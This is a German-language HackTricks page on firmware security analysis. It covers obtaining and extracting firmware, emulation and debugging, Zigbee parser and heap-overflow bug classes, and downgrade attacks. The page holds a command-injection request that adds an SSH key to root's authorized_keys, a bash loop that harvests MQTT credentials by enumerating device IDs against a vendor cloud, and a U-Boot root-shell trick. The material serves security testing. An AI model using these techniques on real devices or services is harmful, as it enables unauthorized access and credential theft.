# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, mit der Geräte korrekt funktionieren, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software, mit der Nutzer interagieren, verwaltet und ermöglicht. Sie ist in einem permanenten Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und anschließend das Betriebssystem gestartet wird. Die Untersuchung und mögliche Änderung der Firmware ist ein entscheidender Schritt, um Sicherheitslücken zu identifizieren.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein entscheidender erster Schritt, um den Aufbau eines Geräts und die darin verwendeten Technologien zu verstehen. Dabei werden Daten zu folgenden Punkten gesammelt:

- CPU-Architektur und verwendetem Betriebssystem
- Einzelheiten zum Bootloader
- Hardware-Layout und Datenblättern
- Codebasis-Metriken und Quellcodeverzeichnissen
- Externen Bibliotheken und Lizenztypen
- Update-Verläufen und behördlichen Zertifizierungen
- Architektur- und Ablaufdiagrammen
- Sicherheitsprüfungen und identifizierten Schwachstellen

Zu diesem Zweck sind **Open-Source-Intelligence- (OSINT-)Tools** unverzichtbar. Ebenso wichtig ist die Analyse verfügbarer Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die jeweils unterschiedlich komplex sind:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- Sie anhand bereitgestellter Anleitungen **erstellen**
- Von offiziellen Support-Websites **herunterladen**
- **Google-Dork**-Abfragen verwenden, um gehostete Firmware-Dateien zu finden
- Direkt auf **Cloud-Speicher** zugreifen, beispielsweise mit [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Updates** mithilfe von Man-in-the-Middle-Techniken abfangen
- Sie über Verbindungen wie **UART**, **JTAG** oder **PICit** vom Gerät **extrahieren**
- In der Gerätekommunikation nach Update-Anfragen **schnüffeln**
- **Fest codierte Update-Endpunkte** identifizieren und verwenden
- Sie aus dem Bootloader oder über das Netzwerk **dumpen**
- Wenn alle anderen Möglichkeiten scheitern, den Speicherchip mithilfe geeigneter Hardware-Tools **ausbauen und auslesen**

### Nur UART-Logs: Eine Root-Shell über die U-Boot-Umgebung im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), lässt sich trotzdem eine init-Shell erzwingen, indem der **U-Boot-Umgebungs-Blob** offline bearbeitet wird:<sup>[[6]](#references)</sup>

1. Den SPI-Flash mit einem SOIC-8-Clip und einem Programmer auslesen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32** für den Blob neu.
3. Flashe nur die env-Partition neu und starte das Gerät neu; auf UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, aber die env-Partition über externen Flash-Zugriff beschreibbar ist.

## Analysieren der Firmware

Da du jetzt **die Firmware hast**, musst du Informationen daraus extrahieren, um zu wissen, wie du damit umgehen sollst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **in die Firmware eingebettete Dateien** extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder du kannst die Datei mit [**binvis.io**](https://binvis.io/#/) ([Code](https://code.google.com/archive/p/binvis/)) untersuchen.

### Dateisystem ermitteln

Mit den zuvor genannten Tools wie `binwalk -ev <bin>` solltest du das **Dateisystem extrahiert** haben.\
Binwalk extrahiert es üblicherweise in einen **Ordner, der nach dem Dateisystemtyp benannt ist**. Das ist normalerweise einer der folgenden Typen: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dateisystem manuell extrahieren

Manchmal enthält binwalk **in seinen Signaturen nicht die Magic Bytes des Dateisystems**. In diesen Fällen kannst du mit binwalk den **Offset des Dateisystems ermitteln**, das komprimierte Dateisystem aus der Binärdatei **herausschneiden** und das Dateisystem anschließend anhand seines Typs mit den folgenden Schritten **manuell extrahieren**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führe den folgenden **dd-Befehl** zum Carving des Squashfs-Dateisystems aus.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware analysieren

Sobald die Firmware vorliegt, ist es wichtig, sie zu zerlegen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dazu werden verschiedene Tools verwendet, um das Firmware-Image zu analysieren und wertvolle Daten daraus zu extrahieren.

### Tools für die erste Analyse

Eine Reihe von Befehlen dient der ersten Untersuchung der Binärdatei (bezeichnet als `<bin>`). Mithilfe dieser Befehle lassen sich Dateitypen erkennen, Strings extrahieren, Binärdaten analysieren sowie Partitions- und Dateisystemdetails nachvollziehen:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf eine mögliche Verschlüsselung oder Komprimierung schließen lässt.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Extrahieren des Dateisystems

Mit `binwalk -ev <bin>` lässt sich das Dateisystem normalerweise extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp jedoch aufgrund fehlender Magic Bytes nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend mit dem Befehl `dd` das Dateisystem herausgeschnitten:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert ist, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen von Update-Servern, unkompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

Zu den **wichtigen Speicherorten** und **Elementen**, die untersucht werden sollten, gehören:

- **etc/shadow** und **etc/passwd** für Benutzerzugangsdaten
- SSL-Zertifikate und Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Schwachstellen
- Eingebettete Binärdateien zur weiteren Analyse
- Gängige Webserver und Binärdateien von IoT-Geräten

Mehrere Tools helfen dabei, sensible Informationen und Schwachstellen im Dateisystem aufzudecken:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zur Suche nach sensiblen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für eine umfassende Firmware-Analyse
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl im Dateisystem gefundener Quellcode als auch kompilierte Binärdateien müssen auf Schwachstellen untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu erkennen, die ausgenutzt werden könnten.

## Cloud-Konfigurationen und MQTT-Zugangsdaten über abgeleitete URL-Tokens abgreifen

Viele IoT-Hubs rufen die gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse lässt sich möglicherweise feststellen, dass `<token>` lokal aus der Geräte-ID und einem fest codierten Geheimnis abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dieses Design ermöglicht es jedem, der eine deviceId und den STATIC_KEY kennt, die URL zu rekonstruieren und die Cloud-Konfiguration abzurufen. Dabei werden häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe offengelegt.

Praktischer Ablauf:

1) deviceId aus UART-Bootprotokollen extrahieren

- Einen 3,3-V-UART-Adapter (TX/RX/GND) anschließen und die Protokolle aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suchen Sie nach Zeilen, die das URL-Muster der Cloud-Konfiguration und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware ermitteln

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten abgreifen

- URL zusammenstellen und JSON mit curl abrufen; mit jq analysieren, um Secrets zu extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Klartext-MQTT und schwache Topic-ACLs ausnutzen (falls vorhanden)

- Mit wiederhergestellten Zugangsdaten Wartungs-Topics abonnieren und nach sensiblen Ereignissen suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersehbare Geräte-IDs enumerieren (in großem Umfang und mit Autorisierung)

- Viele Ökosysteme betten Vendor-OUI-/Produkt-/Typ-Bytes ein, gefolgt von einem fortlaufenden Suffix.
- Du kannst Kandidaten-IDs iterieren, Tokens ableiten und Konfigurationen programmatisch abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du eine Massenerfassung versuchst.
- Ziehe nach Möglichkeit Emulation oder statische Analyse vor, um Geheimnisse wiederherzustellen, ohne die Zielhardware zu verändern.


Die Firmware-Emulation ermöglicht eine **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms. Dabei kann es zu Herausforderungen durch Hardware- oder Architekturabhängigkeiten kommen. Die Übertragung des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, etwa einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann weitere Tests erleichtern.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu bestimmen.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für die MIPS-Architektur zu emulieren, kann man folgenden Befehl verwenden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationstools zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet, für Little-Endian-Binärdateien eignet sich `qemu-mipsel`.

#### Emulation der ARM-Architektur

Bei ARM-Binärdateien ist der Prozess ähnlich: Für die Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation. Sie automatisieren den Prozess und unterstützen die dynamische Analyse.

## Dynamische Analyse in der Praxis

In dieser Phase wird eine echte oder emulierte Geräteumgebung für die Analyse verwendet. Shell-Zugriff auf das Betriebssystem und das Dateisystem muss unbedingt erhalten bleiben. Die Emulation bildet Hardwareinteraktionen möglicherweise nicht perfekt nach, weshalb sie gelegentlich neu gestartet werden muss. Bei der Analyse sollten das Dateisystem erneut untersucht, offengelegte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erkundet werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu identifizieren.

## Techniken zur Laufzeitanalyse

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung interagiert. Tools wie gdb-multiarch, Frida und Ghidra dienen dazu, Breakpoints zu setzen und mithilfe von Fuzzing und anderen Techniken Schwachstellen zu identifizieren.

Bei eingebetteten Zielen ohne vollständigen Debugger **kopieren Sie ein statisch gelinktes `gdbserver`** auf das Gerät und verbinden Sie sich remote damit:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee- / Radio-Co-Prozessor-Nachrichten-Mapping

Bei IoT-Hubs ist der RF-Stack oft zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow ist, den Pfad abzubilden:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Controllerseitiger Parser** auf dem Radio-MCU
3. **Serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur schafft zwei Reverse-Engineering-Ziele statt nur einem. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten vom **Netzwerk** kommen können und welche vom Controller selbst
- Die genauen **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee-`manufacturer_code` und benutzerdefinierter `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Modell-Download-Phasen erreichbar sind

Speziell bei Zigbee solltest du Pairing-Datenverkehr mitschneiden und prüfen, ob das Zielgerät noch den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Falls ja, kann das Mitschneiden des Commissioning-Datenverkehrs den **Network Key** offenlegen. Zigbee-3.0-Installationscodes verringern diese Offenlegung; halte daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM begrenzte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parser-Code** und interne **FSMs** mit weniger erprobter Validierung speisen.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Kehre den Command-Dispatcher um, bis du den **herstellerspezifischen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifiziere **Übergangszustände**, die automatisch weiterlaufen, sowie Retry-/Fehlerzweige, die letztlich den vom Angreifer kontrollierten Zustand zurücksetzen oder freigeben.
- Stelle fest, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt davon auszugehen, dass der fehlerhafte Handler jederzeit erreichbar ist.

Bei zeitkritischen Protokollen kann die Paketwiedergabe über ein Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem herstellergerechten Stack zu emulieren, damit die korrekten **Endpunkte**, **Attribute** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse bei fragmentierten Downloads in eingebetteten Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Modell-/Konfigurationsdownloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und alloziert `malloc(total_size)`.
2. Spätere Fragmente validieren nur die vom Angreifer kontrollierten **paketlokalen** Felder wie `packet_total_size >= offset + chunk_len`.
3. Der Kopiervorgang verwendet `memcpy(&ctx->buffer[offset], chunk, chunk_len)`, ohne die **ursprünglich alloziierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein gültiges erstes Fragment mit einer **kleinen** deklarierten Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht und dennoch den ursprünglich alloziierten Buffer überlaufen lässt.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit genügend **Geräteemulation** umfassen, um das Ziel in den erwarteten Modell-Download- oder Blob-Download-Zustand zu versetzen, bevor die fehlerhaften Fragmente gesendet werden.

### Protokollgesteuerte `free()`-Trigger

In eingebetteten Daemons lässt sich Heap-Metadaten-Exploitation oft am einfachsten nicht durch „auf die Bereinigung warten“, sondern durch **gezieltes Auslösen der protokolleigenen Fehlerbehandlung** erreichen:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Fehlerzustände** zu versetzen.
- Überschreite die Retry-Schwelle, damit der Daemon den Kontext **zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze dieses vorhersagbare `free()`, um allocatorseitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich bei **musl/uClibc/dlmalloc-ähnlichen** Allokatoren in eingebettetem Linux, wo beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in ein Schreib-Primitive verwandeln können. Ein stabiles Muster ist, ein **Größenfeld** zu beschädigen, um die Traversierung des Allokators auf **Fake-Chunks innerhalb des übergelaufenen Buffers** umzulenken, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binäre Exploitation und Proof of Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierkenntnisse in Low-Level-Sprachen. Binäre Laufzeitschutzmechanismen sind in eingebetteten Systemen selten, doch wenn sie vorhanden sind, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen, daher muss jeder Fake-Chunk die Prüfungen bestehen (plausible Größe, `fd = 0` und umgebende Chunks müssen als „in use“ gelten).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binärdateien unter ASLR:** Wenn ASLR aktiviert, die Hauptbinärdatei aber **non-PIE** ist, sind In-Binary-`.data`-/`.bss`-Adressen stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf eine **Function-Pointer-Tabelle** umzulenken.
- **Parser-stoppendes NUL:** Beim Parsen von JSON kann ein `\x00` im Payload das Parsing beenden und gleichzeitig nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack-Pivot bzw. eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) stellen vorkonfigurierte Umgebungen für Firmware-Sicherheitstests mit den erforderlichen Tools bereit.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dich bei der Sicherheitsbewertung und beim Pentesting von Internet-of-Things-Geräten (IoT) unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Betriebssystem für eingebettete Sicherheitstests auf Basis von Ubuntu 18.04, mit vorinstallierten Tools für Firmware-Sicherheitstests.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, wird der **Schutz vor Versions-Rollbacks (Downgrades) häufig ausgelassen**. Wenn der Boot- oder Recovery-Loader lediglich die Signatur mit einem eingebetteten öffentlichen Schlüssel überprüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer rechtmäßig eine **ältere, verwundbare Firmware mit gültiger Signatur** installieren und so gepatchte Schwachstellen erneut einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres signiertes Image beschaffen**
   * Vom öffentlichen Download-Portal, CDN oder der Support-Website des Herstellers herunterladen.
   * Aus zugehörigen mobilen/desktop Anwendungen extrahieren (z. B. aus `assets/firmware/` in einem Android-APK).
   * Aus Drittanbieter-Repositories wie VirusTotal, Internet-Archiven, Foren usw. beziehen.
2. **Das Image über einen verfügbaren Update-Kanal hochladen oder dem Gerät bereitstellen**:
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Verbraucher stellen *nicht authentifizierte* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs akzeptieren, serverseitig dekodieren und den Recovery-/Upgrade-Vorgang auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in der neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Command-Injection-Filter).
4. Optional nach Erlangung der Persistenz wieder das neueste Image flashen oder Updates deaktivieren, um eine Entdeckung zu vermeiden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (heruntergestuften) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch die Injection beliebiger Befehle möglich ist (hier: Aktivierung des SSH-keybasierten Root-Zugriffs). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch da kein Downgrade-Schutz vorhanden ist, ist die Fehlerbehebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Anbieter bündeln vollständige Firmware-Images in ihren zugehörigen mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind häufig unverschlüsselt im APK/APEX unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar dem einfachen `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Umgehung des Anti-Rollback-Schutzes nur im Updater bei A/B-Slot-Designs

Einige Anbieter implementieren zwar einen Anti-Downgrade-**Ratchet**, aber nur in der *Updater*-Logik (zum Beispiel in einer UDS-Routine über CAN, einem Recovery-Befehl oder einem Userspace-OTA-Agenten). Prüft der **Bootloader** später nur die Image-Signatur/CRC und vertraut der Partitionstabelle oder den Slot-Metadaten, kann der Rollback-Schutz trotzdem umgangen werden.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem in persistentem Speicher abgelegten Wert und weist ältere signierte Images zurück.
- Der Bootloader **wertet den Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem generationsbasierten Zähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten Firmware-Hash gebunden**, der validiert wurde.

Dadurch entsteht in Dual-Slot-Systemen eine Primitive nach dem Muster **ein Image validieren / ein anderes booten**. Kann der Angreifer den Updater dazu bringen, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren und Slot B später vor dem Neustart überschreiben, bootet der Bootloader möglicherweise trotzdem das zurückgestufte Image, weil er nur den bereits gespeicherten Slot-Metadaten vertraut.

Häufiges Angriffsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Umschaltroutine ausführen, sodass das Layout diesen Slot als nächstes aktives Ziel markiert.
2. **Noch nicht neu starten**. In derselben Sitzung erneut die Slot-Vorbereitungs-/Löschroutine aufrufen.
3. Veraltete Boot-Status- oder Slot-Auswahllogik ausnutzen, damit der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet durchsetzt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf bei der Analyse von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine Routine vom Typ `prepare_passive_slot()`, die einen Slot anhand veralteter Zustandsdaten statt anhand des **aktuell gespeicherten Layouts** löscht.
- Eine Funktion vom Typ `part_write_layout()`, die nur einen **Generationszähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht in ROM / Bootloader / Secure-Boot-Stufen**.
- Lösch- oder Recovery-Routinen, die den Slot weiterhin als bootfähig markieren, obwohl sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport bzw. die Authentifizierung des *Update-Endpunkts* angemessen geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
